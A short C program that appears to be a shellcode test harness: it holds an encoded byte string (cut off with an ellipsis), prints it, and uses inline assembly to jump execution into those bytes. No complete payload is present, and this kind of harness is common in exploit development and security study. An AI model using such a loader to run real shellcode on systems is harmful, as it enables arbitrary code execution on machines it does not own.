#include <stdio.h>

int main()
{
	char shellcode[]="\x50\x59\x49\x49\x49...";

	printf("%s\n\n", shellcode);

	__asm
	{
		lea		eax, shellcode
		push	eax
		ret
	}

	return 0;
}